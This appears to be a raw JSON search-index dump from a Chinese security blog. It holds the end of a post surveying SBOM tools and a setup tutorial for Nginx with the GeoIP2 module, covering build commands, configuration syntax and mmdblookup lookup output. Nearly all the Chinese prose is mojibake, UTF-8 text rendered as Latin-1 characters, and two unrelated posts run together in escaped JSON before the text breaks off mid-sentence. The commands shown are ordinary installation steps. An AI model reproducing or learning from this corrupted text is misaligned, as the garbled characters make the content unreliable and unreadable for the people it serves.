DevSecOpså…¬å¸Rezilionå°†SBOMä½œä¸ºå…¶æ•´ä½“è½¯ä»¶å®‰å…¨å’Œæ¼æ´ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚å®ƒçš„åŠ¨æ€SBOMä½¿ç”¨åŠ¨æ€è¿è¡Œæ—¶åˆ†ææ¥è·Ÿè¸ªä»£ç æ›´æ”¹æ—¶çš„è½¯ä»¶æ”»å‡»é¢ã€‚å› æ­¤ï¼Œå®ƒä¼šä¸æ–­æŸ¥æ‰¾ä»£ç ç»„ä»¶çš„å·²çŸ¥å¼±ç‚¹ã€‚æ¢å¥è¯è¯´ï¼Œè¿™æ˜¯è·Ÿè¸ªå’Œä¿æŠ¤ä»£ç çš„äºŒåˆä¸€æ–¹æ³•ã€‚\nÂ é™¤äº†æä¾›CI&#x2F;CDã€stagingå’Œç”Ÿäº§ç¯å¢ƒä¸­æ‰€æœ‰è½¯ä»¶ç»„ä»¶çš„å®æ—¶æ¸…å•å¤–ï¼Œå®ƒè¿˜ä¼šä¸æ–­æ›´æ–°æ‚¨çš„SBOMã€‚æ‚¨å¯ä»¥å¯¼å‡ºæ‚¨çš„SBOMçš„CycloneDXå’ŒExcelç”µå­æ ¼å¼ã€‚\nSPDX SBOM Generator SPDX SBOM Generatoræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¼€æºå·¥å…·ï¼Œé¡¾åæ€ä¹‰ï¼šå®ƒä»å½“å‰çš„åŒ…ç®¡ç†å™¨æˆ–æ„å»ºç³»ç»Ÿåˆ›å»ºSPDX SBOMã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒçš„å‘½ä»¤è¡Œä»ä»£ç ç”ŸæˆSBOMæ•°æ®ã€‚å®ƒæŠ¥å‘Šä»£ç çš„ç»„ä»¶ã€è®¸å¯ã€ç‰ˆæƒå’Œå®‰å…¨å¼•ç”¨ã€‚è¯¥æ•°æ®åœ¨SPDX v2.2è§„èŒƒä¸­å¯¼å‡ºã€‚å¦‚æœä½ åªéœ€è¦åŸºç¡€ä¿¡æ¯ï¼Œå®ƒä¼šå¾ˆé€‚åˆä½ ã€‚ [[å¾®è½¯å¼€æºå…¶è½¯ä»¶ææ–™æ¸…å•ï¼ˆSBOMï¼‰ç”Ÿæˆå·¥å…·#0x02SPDXè§„èŒƒ]]\nTern å¦ä¸€ä¸ªå¼€æºSBOMé¡¹ç›®ï¼ŒTernå¯èƒ½ä¸SPDX SBOM Generatorå¾ˆå¥½åœ°é…åˆã€‚ä¸ä½¿ç”¨åŒ…ç®¡ç†å™¨æˆ–æ„å»ºç³»ç»Ÿï¼Œè¿™ä¸ªSCAå·¥å…·å’ŒPythonåº“ä¸ºå®¹å™¨é•œåƒå’ŒDockerfilesç”Ÿæˆä¸€ä¸ªSBOMã€‚å®ƒè¿˜ç”ŸæˆSPDXæ ¼å¼çš„SBOMã€‚\nTauruSeer è¿™ä¸ªSBOMç¨‹åºæ˜¯ä»¥è½¯ä»¶å³æœåŠ¡(SaaS)çš„å½¢å¼æä¾›çš„ã€‚å‡­å€Ÿä»¥åº”ç”¨ä¸ºä¸­å¿ƒçš„ä¸“åˆ©é›†æˆæ–¹æ³•ï¼ŒTauruserå°†è®¤çŸ¥å¼•æ“å®‰å…¨æ‰«æä¸SBOMç›¸ç»“åˆã€‚è¯¥åŒ…å°†å¸®åŠ©æ‚¨ä¸ºå¼€å‘äººå‘˜å’Œå®¢æˆ·ä¿æŠ¤å’Œè·Ÿè¸ªæ‚¨çš„ä»£ç ã€‚\nVigilant Ops Vigilant Opsæ˜¯ä¸€å®¶åŒ»ç–—è®¾å¤‡ç½‘ç»œå®‰å…¨å…¬å¸ï¼Œå…¶InSightPlatformå·²å°†æ³¨æ„åŠ›è½¬å‘SBOMã€‚å®ƒçš„SaaSå¹³å°äº§ç”Ÿã€ç»´æŠ¤ã€éªŒè¯å…±äº«çš„è®¤è¯SBOMã€‚å®ƒé€šè¿‡æŒç»­çš„æ¼æ´ç›‘è§†å’Œè­¦æŠ¥é›†æˆäº†å®‰å…¨æ€§ã€‚å…¶SBOMè®¤è¯é‡‡ç”¨ä¸“åˆ©ç®—æ³•ï¼Œç¡®ä¿æ‰€æœ‰ç»„ä»¶éƒ½ç»è¿‡éªŒè¯ï¼Œæ¼æ´éƒ½æœ‰å¯¹åº”é“¾æ¥ã€‚ å®ƒçš„å®‰å…¨ç‰¹æ€§è¿˜å¯ä»¥ç”¨äºå…¶ä»–ç¨‹åºç”Ÿæˆçš„SBOMï¼Œå®ƒä»¬åœ¨é™æ­¢å’Œä¼ è¾“è¿‡ç¨‹ä¸­éƒ½è¢«åŠ å¯†\nReferenceslinuxåŸºé‡‘ä¼šOpenSSFOpenChainSite Unreachable\n","slug":"SBOMå·¥å…·ä»‹ç»","date":"2022-08-22T02:26:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SBOM,è½¯ä»¶ç‰©æ–™æ¸…å•,è½¯ä»¶ç‰©æ–™æ¸…å•ç”Ÿæˆå·¥å…·","author_index":"Moses"},{"id":"8f0f57e3d20bdf89f372a3376a26a3ed","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Nginx+GeoIP2","content":"0x00å‰è¨€æè¿°: ä¸ºäº†å®ç°æ ¹æ®è®¿é—®è€…è®¿é—®æˆ‘ä»¬çš„ç½‘ç«™æ—¶æ ¹æ®å…¶IPæ˜¾ç¤ºå…¶æ‰€å±åœ°ï¼Œä¹Ÿä¸ºè·å–ä¸åŒåœ°åŒºè®¿é—®è€…çš„IPåœ°å€ç­‰ç›¸å…³ä¿¡æ¯ä¸ºç›®çš„ï¼Œæ‰€ä»¥åœ¨æœç´¢å¼•æ“ä¸­æŸ¥æ‰¾è§£å†³æ–¹æ¡ˆï¼Œåœ¨ç½‘ç»œä¸ŠæŸ¥è¯¢åˆ°å¦‚ä¸‹å‡ ç§æ–¹æ¡ˆNginx+GeoIP2ã€ä½¿ç”¨æ”¶è´¹ IP è¯†åˆ«æ¥å£ã€DNS æ ¹æ®åœ°åŸŸè§£æï¼Œç„¶åç»è¿‡å¤šæ–¹é¢è€ƒç©¶ï¼Œæœ€ç»ˆè¿˜æ˜¯ä½¿ç”¨Nginx+GeoIP2è§£å†³æ–¹æ¡ˆã€‚\nä¸‰ç§è§£å†³æ–¹æ¡ˆä¼˜ç¼ºç‚¹\n\nNginx + GeoIP2å¯ä»¥æ‹¿åˆ°è¯·æ±‚ IP çš„å›½å®¶å’ŒåŸå¸‚ä¿¡æ¯ç„¶åè¿›è¡Œå„ç§ä¸ªæ€§åŒ– Nginx é…ç½®å¯ä»¥å°†è¯·æ±‚ IP çš„åœ°ç†ä½ç½®é€šè¿‡ php-fpm ä¼ é€’ php ç¨‹åºå®šæ—¶æ›´æ–° MaxMind å…è´¹æ•°æ®åº“ï¼ˆGeoLite2-Country.mmdb + GeoLite2-City.mmdbï¼‰å®Œæˆå®Œç¾é—­ç¯maxmind å…¬å¸ 2002 å¹´æˆç«‹è‡³ä»Šï¼Œé è°±\n\nÂ ä½¿ç”¨ IP è¯†åˆ«æ¥å£ï¼šç¨³å®šçš„éœ€è¦æ”¶è´¹ï¼ˆä¹Ÿä¸èƒ½ä¿è¯ 100% é«˜å¯ç”¨ï¼šé™é¢‘ã€å“åº”æ—¶é—´ã€æ¥å£å¼‚å¸¸ç­‰å› ç´ ï¼‰ï¼Œå…è´¹çš„æ— æ³•ä¿è¯ç¨³å®šæ€§ï¼Œæ¥å£è¿œè¿œæ²¡æœ‰å°† GeoLite æ•°æ®æ”¾åœ¨æœ¬åœ°ç¨³å®š\n\nÂ DNS æ ¹æ®åœ°åŸŸè§£æï¼šcloudflare æ”¶è´¹ç•¥è´µï¼Œå›½å†… cloudxns å·²å…³é—­å…è´¹æœåŠ¡ï¼ˆå…è´¹çš„ä¸œè¥¿è¯´å˜å°±å˜ï¼Œè®º planB çš„é‡è¦æ€§ï¼‰\n\n\n\n\n\n\n\n\n\n\n\nTIPS:Â MaxMind GeoIP å·²ç»è¢«å¼ƒç”¨äº†ä¸€æ®µæ—¶é—´ã€‚å¯¹äºæ‚¨æœ€æ–°çš„åœ°ç†å®šä½éœ€æ±‚ï¼Œè¯·æ”¹ç”¨ MaxMind GeoIP2ï¼ˆæˆ–å…è´¹ç‰ˆæœ¬çš„ GeoLite2ï¼‰ã€‚TIPS:Â å½“å‰ç½‘ä¸Šå¤§éƒ¨åˆ†Nginx + GeoIP çš„æ•™ç¨‹éƒ½æ˜¯ GeoIP è€ç‰ˆæœ¬çš„å·²ç»ä¸é€‚ç”¨äº†å½“å‰æœ€æ–°ç‰ˆæœ¬çš„NginxäºŒè¿›åˆ¶ç¼–è¯‘å®‰è£…ï¼Œä½ å¯å‚ç…§æœ¬ç« æ›´å¿«çš„è¿›è¡Œå®è·µä½¿ç”¨ã€‚TIPS:Â GeoUP ä¾èµ– MaxMind çš„ IP æ•°æ®ï¼Œéœ€è¦é¢‘ç¹æ›´æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å®‰è£…é…ç½®åä¹Ÿå®ç°äº†ä½¿ç”¨crontabæœåŠ¡ï¼Œé’ˆå¯¹å…¶å›½å®¶åŸå¸‚æ•°æ®åº“è¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬å®šæ—¶æ›´æ–°é…ç½®ã€‚\n0x01å®‰è£…éƒ¨ç½²ç¯å¢ƒè¯´æ˜# å®¿ä¸»æœºç³»ç»Ÿ\n$ uname -a\n113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU&#x2F;Linux\n$ cat &#x2F;etc&#x2F;issue.net\nUbuntu 20.04.1 LTS\n\n# åº”ç”¨è½¯ä»¶\nnginx-1.22.0.tar.gz\nlibmaxminddb-1.6.0.tar.gz\nngx_http_geoip2_module-3.4.tar.gz\nGeoLite2-City_20220802.tar.gz\nGeoLite2-Country_20220802.tar.gz\n\nç³»ç»ŸåŠ å›ºç¬¦åˆç­‰ä¿2.0è¦æ±‚ï¼ŒåŠ å›ºè„šæœ¬\nèµ„æºä¸‹è½½ä¸‹è½½åœ°å€:ï¼ˆè®¿é—®å¯†ç ï¼š2088ï¼‰\nlibmaxminddbä¸‹è½½æè¿°: é¦–å…ˆå®‰è£… libmaxminddb åº“ï¼Œå…¶æä¾›äº†ä¸€ä¸ªç”¨äºè¯»å–MaxMind DBæ–‡ä»¶çš„Cåº“ï¼ŒåŒ…æ‹¬æ¥è‡ªMaxMindçš„GeoIP2æ•°æ®åº“ã€‚è¿™æ˜¯ä¸€ç§è‡ªå®šä¹‰äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ—¨åœ¨ä¿ƒè¿› IP åœ°å€çš„å¿«é€ŸæŸ¥æ‰¾ï¼ŒåŒæ—¶å…è®¸åœ¨ä¸åœ°å€å…³è”çš„æ•°æ®ç±»å‹æ–¹é¢å…·æœ‰æå¤§çš„çµæ´»æ€§ã€‚\né¡¹ç›®åœ°å€:Â https://github.com/maxmind/libmaxminddbä¸‹è½½æ„å»º:\nwget -c https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;libmaxminddb&#x2F;releases&#x2F;download&#x2F;1.6.0&#x2F;libmaxminddb-1.6.0.tar.gz\ntar -zxvf libmaxminddb-1.6.0.tar.gz &amp;&amp; cd libmaxminddb-1.6.0\n.&#x2F;configure\nmake &amp;&amp; make install\ntee -a &#x2F;etc&#x2F;ld.so.conf.d&#x2F;libc.conf &lt;&lt;&#39;EOF&#39;\n# libc default configuration\n&#x2F;usr&#x2F;local&#x2F;lib\nEOF\nsudo ldconfig\næˆ–ä½¿ç”¨aptå‘½ä»¤è¿›è¡Œå®‰è£…:\n$ sudo apt update  \n$ sudo apt install libmaxminddb0 libmaxminddb-dev mmdb-bin geoipupdate\nä¸Šé¢å®‰è£…çš„è½¯ä»¶åŒ…æ˜¯ï¼š\n\nlibmaxminddb0 libmaxminddb-dev â€“ MaxMind åœ°ç†å®šä½æ•°æ®åº“\n\nmmdb-bin â€“ äºŒè¿›åˆ¶ã€‚ä»å‘½ä»¤è¡Œè°ƒç”¨çš„ç¨‹åºã€‚ä½¿ç”¨æ­¤å‘½ä»¤æ‰‹åŠ¨å®šä½ IPã€‚\n\ngeoipupdate â€“ å¸®åŠ©é…ç½®å’Œæ›´æ–° GeoIP2 &#x2F; GeoLite2 çš„è½¯ä»¶åŒ…ã€‚\n\n\nngx_http_geoip2_moduleä¸‹è½½æè¿°: ä¸‹è½½ ngx_http_geoip2_module ä½¿ç”¨åŸºäºå®¢æˆ·ç«¯ IPï¼ˆé»˜è®¤ï¼‰æˆ–ç‰¹å®šå˜é‡ï¼ˆåŒæ—¶æ”¯æŒ IPv4 å’Œ IPv6ï¼‰çš„Â maxmind geoip2Â æ•°æ®åº“ä¸­çš„å€¼åˆ›å»ºå˜é‡ï¼Œè¯¥æ¨¡å—ç°åœ¨æ”¯æŒnginxæµï¼Œå¹¶ä¸”å¯ä»¥ä»¥ä¸httpæ¨¡å—ç›¸åŒçš„æ–¹å¼ä½¿ç”¨ã€‚\né¡¹ç›®åœ°å€:Â https://github.com/leev/ngx_http_geoip2_module/ä¸‹è½½æ„å»º:\nwget -c https:&#x2F;&#x2F;github.com&#x2F;leev&#x2F;ngx_http_geoip2_module&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;3.4.tar.gz -O &#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_http_geoip2_module-3.4.tar.gz\ntar -zxf ngx_http_geoip2_module-3.4.tar.gz &amp;&amp; ls ngx_http_geoip2_module-3.4&#x2F;\n  # config  LICENSE  ngx_http_geoip2_module.c  ngx_stream_geoip2_module.c  README.md\nGeoip2 æ¨¡å—è¯­æ³•è¯­æ³•ç¤ºä¾‹ï¼š\n# HTTP\nhttp &#123;\n  ...\n  geoip2 &#x2F;etc&#x2F;maxmind-country.mmdb &#123;\n    auto_reload 5m;\n    $geoip2_data_country_code default&#x3D;US source&#x3D;$variable_with_ip country iso_code;\n &#125;\n&#125;\n\n# Stream\nstream &#123;\n  ...\n  geoip2 &#x2F;etc&#x2F;maxmind-country.mmdb &#123;\n    auto_reload 5m;\n    $geoip2_data_country_code default&#x3D;US source&#x3D;$remote_addr country iso_code;\n  &#125;\n  ...\n&#125;\nå‚æ•°è¯´æ˜:\n\nauto_reload &lt;interval&gt;: å¯ç”¨è‡ªåŠ¨é‡æ–°åŠ è½½å°†ä½¿ nginx ä»¥æŒ‡å®šçš„æ—¶é—´é—´éš”æ£€æŸ¥æ•°æ®åº“çš„ä¿®æ”¹æ—¶é—´ï¼Œå¦‚æœå‘ç”Ÿæ›´æ”¹åˆ™é‡æ–°åŠ è½½ã€‚\n\n$variable_name [default=&lt;value] [source=$variable_with_ip] path ...: å¦‚æœæ²¡æœ‰æŒ‡å®šã€defaultã€‘å‚æ•°ï¼Œåˆ™å¦‚æœæœªæ‰¾åˆ°è¯¥å˜é‡å°†ä¸ºç©ºï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šã€sourceã€‘å‚æ•° $remote_addr å°†ç”¨äºæ‰§è¡ŒæŸ¥æ‰¾ã€‚\n\n\nmmdblookup å‘½ä»¤æè¿°: åœ¨å‰é¢ç¼–è¯‘å®‰è£…libmaxminddbåº“åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨ mmdblookup å·¥å…·ï¼ŒæŸ¥æ‰¾æ‰€éœ€æ•°æ®çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼šå›½å®¶&#x2F;åœ°åŒºåç§°ï¼‰ï¼Œä»¥JSONæ ¼å¼è¿”å›çš„ï¼Œå…¶ä¸­continentï¼ˆæ´²ï¼‰ ã€country (å›½å®¶) ã€registered_countryï¼ˆå·²æ³¨å†Œçš„å›½å®¶ï¼‰å¯¹è±¡åŒ…å«äº†code/geoname_id/namesé”®ï¼š\nGeoLite2-Country.mmdb åº“åªå¸¦æœ‰ country ç›¸å…³æ•°æ®æ ·æœ¬è¾“å‡º\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6\n&#123;\n  &quot;continent&quot;:\n    &#123;\n      &quot;code&quot;:\n        &quot;AS&quot; &lt;utf8_string&gt;\n      &quot;geoname_id&quot;:\n        6255147 &lt;uint32&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;Asien&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;Asia&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;Asia&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Asie&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;ã‚¢ã‚¸ã‚¢&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;Ãsia&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;ĞĞ·Ğ¸Ñ&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;äºšæ´²&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n  &quot;country&quot;:\n    &#123;\n      &quot;geoname_id&quot;:\n        1814991 &lt;uint32&gt;\n      &quot;iso_code&quot;:\n        &quot;CN&quot; &lt;utf8_string&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Chine&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;ĞšĞ¸Ñ‚Ğ°Ğ¹&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n  &quot;registered_country&quot;:\n    &#123;\n      &quot;geoname_id&quot;:\n        1814991 &lt;uint32&gt;\n      &quot;iso_code&quot;:\n        &quot;CN&quot; &lt;utf8_string&gt;\n      &quot;names&quot;:\n        &#123;\n          &quot;de&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;en&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;es&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;fr&quot;:\n            &quot;Chine&quot; &lt;utf8_string&gt;\n          &quot;ja&quot;:\n            &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n          &quot;pt-BR&quot;:\n            &quot;China&quot; &lt;utf8_string&gt;\n          &quot;ru&quot;:\n            &quot;ĞšĞ¸Ñ‚Ğ°Ğ¹&quot; &lt;utf8_string&gt;\n          &quot;zh-CN&quot;:\n            &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n        &#125;\n    &#125;\n&#125;\nGeoLite2-City.mmdb åº“å¸¦æœ‰ country City ç›¸å…³æ•°æ®æ ·æœ¬è¾“å‡º (ä¸€èˆ¬æ¨èä½¿ç”¨è¯¥åº“)\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6\n &#123;\n    &quot;city&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1808926 &lt;uint32&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;æ­å·å¸‚&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;Hangzhou&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;Ğ¥Ğ°Ğ½Ñ‡Ğ¶Ğ¾Ñƒ&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;æ­å·&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;continent&quot;:\n      &#123;\n        &quot;code&quot;:\n          &quot;AS&quot; &lt;utf8_string&gt;\n        &quot;geoname_id&quot;:\n          6255147 &lt;uint32&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;Asien&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;Asia&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;Asia&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Asie&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;ã‚¢ã‚¸ã‚¢&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;Ãsia&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;ĞĞ·Ğ¸Ñ&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;äºšæ´²&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;country&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1814991 &lt;uint32&gt;\n        &quot;iso_code&quot;:\n          &quot;CN&quot; &lt;utf8_string&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Chine&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;ĞšĞ¸Ñ‚Ğ°Ğ¹&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;location&quot;:\n      &#123;\n        &quot;accuracy_radius&quot;:\n          1000 &lt;uint16&gt;\n        &quot;latitude&quot;:\n          30.299400 &lt;double&gt;\n        &quot;longitude&quot;:\n          120.161200 &lt;double&gt;\n        &quot;time_zone&quot;:\n          &quot;Asia&#x2F;Shanghai&quot; &lt;utf8_string&gt;\n      &#125;\n    &quot;registered_country&quot;:\n      &#123;\n        &quot;geoname_id&quot;:\n          1814991 &lt;uint32&gt;\n        &quot;iso_code&quot;:\n          &quot;CN&quot; &lt;utf8_string&gt;\n        &quot;names&quot;:\n          &#123;\n            &quot;de&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;en&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;es&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;fr&quot;:\n              &quot;Chine&quot; &lt;utf8_string&gt;\n            &quot;ja&quot;:\n              &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n            &quot;pt-BR&quot;:\n              &quot;China&quot; &lt;utf8_string&gt;\n            &quot;ru&quot;:\n              &quot;ĞšĞ¸Ñ‚Ğ°Ğ¹&quot; &lt;utf8_string&gt;\n            &quot;zh-CN&quot;:\n              &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n          &#125;\n      &#125;\n    &quot;subdivisions&quot;:\n      [\n        &#123;\n          &quot;geoname_id&quot;:\n            1784764 &lt;uint32&gt;\n          &quot;iso_code&quot;:\n            &quot;ZJ&quot; &lt;utf8_string&gt;\n          &quot;names&quot;:\n            &#123;\n              &quot;en&quot;:\n                &quot;Zhejiang&quot; &lt;utf8_string&gt;\n              &quot;fr&quot;:\n                &quot;Province de Zhejiang&quot; &lt;utf8_string&gt;\n              &quot;zh-CN&quot;:\n                &quot;æµ™æ±Ÿçœ&quot; &lt;utf8_string&gt;\n            &#125;\n        &#125;\n      ]\n  &#125;\nGeoLite2-Country.mmdb ä¸ GeoLite2-Country.mmdb å¯¹æ¯”\n# - å›½å®¶ .&#x2F;GeoLite2-Country.mmdb åº“\n# å¦‚æœæ­¤æ—¶æˆ‘åªæƒ³è·å– country çš„åç§°å¯ä»¥è¿™æ ·ã€‚\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6 country names zh-CN\n  &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n# å½“ç„¶å¦‚æœä½ æƒ³è·å–å›½å®¶çš„ iso_code ä¹Ÿæ˜¯åŒæ ·çš„ã€‚\n$ mmdblookup --file .&#x2F;GeoLite2-Country.mmdb --ip 223.6.6.6 country iso_code\n  &quot;CN&quot; &lt;utf8_string&gt;\n\n# - å›½å®¶ã€åŸå¸‚åº“ .&#x2F;GeoLite2-Country.mmdb åº“\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 country names zh-CN\n  &quot;ä¸­å›½&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 country iso_code\n  &quot;CN&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 continent names zh-CN\n  &quot;äºšæ´²&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 subdivisions 0 names zh-CN\n  &quot;æµ™æ±Ÿçœ&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 subdivisions 0 names iso_code\n  &quot;ZJ&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 city names zh-CN\n  &quot;æ­å·&quot; &lt;utf8_string&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location longitude # ç»åº¦  \n  120.161200 &lt;double&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location latitude  # çº¬åº¦\n  30.299400  &lt;double&gt;\n$ mmdblookup --file .&#x2F;GeoLite2-City.mmdb --ip 223.6.6.6 location time_zone # æ—¶åŒº\n  &quot;Asia&#x2F;Shanghai&quot; &lt;utf8_string&gt;\nä¸Šè¿°çš„ä¸¤ä¸ªç¤ºä¾‹æˆ‘ä»¬å¯ä»¥å°†å…¶è½¬æ¢ä¸º geoip2 æ¨¡å—å®šä¹‰çš„nginxå˜é‡\n# å¦‚åªéœ€è¦å›½å®¶ä¿¡æ¯å»ºè®®ä½¿ç”¨è¯¥åº“\ngeoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-Country.mmdb &#123;\n  $geoip2_data_country &quot;default&#x3D;China&quot; source&#x3D;$remote_addr country names en\n&#125;\n\n# å¦‚éœ€è¦è·å–å›½å®¶ä»¥åŠçœä»½ä¿¡æ¯å»ºè®®ä½¿ç”¨è¯¥åº“ï¼Œæ­¤å¤„æš‚ä¸æ¼”ç¤ºä½¿ç”¨ï¼Œåœ¨åç»­å®è·µä¸­å†è¿›è¡Œä»‹ç»å’Œä½¿ç”¨ã€‚\ngeoip2 &#x2F;usr&#x2F;local&#x2F;GeoIP2&#x2F;GeoLite2-City.mmdb &#123;\n  $geoip2_data_country &quot;default&#x3D;ä¸­å›½&quot; source&#x3D;$remote_addr country names zh-CN;  # ä¸­å›½\n  $geoip2_data_country_code country iso_code;                  # CN\n  $geoip2_data_country_continent continent names zh-CN;        # äºšæ´²\n  $geoip2_data_country_continent_code continent code;          # AS\n  $geoip2_data_province_name subdivisions 0 names zh-CN;       # æµ™æ±Ÿçœ\n  $geoip2_data_province_isocode subdivisions 0 names iso_code; # &quot;ZJ&quot;\n  $geoip2_data_city city names zh-CN;                         # æ­å·\n  $geoip2_data_city_longitude location longitude;              # 120.161200\n  $geoip2_data_city_latitude location latitude;                # 30.299400\n  $geoip2_data_city_time_zone location time_zone;             # &quot;Asia&#x2F;Shanghai&quot;\n&#125;\næ¸©é¦¨æç¤º: å½“è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„åœ°å€æ—¶ï¼Œå°†ä½¿ç”¨â€œX-Forwarded-Forâ€è¯·æ±‚æ ‡å¤´å­—æ®µä¸­çš„åœ°å€, å¹¶ä¸”è®¾ç½®Â geoip2_proxy_recursive &lt; on | off &gt;Â 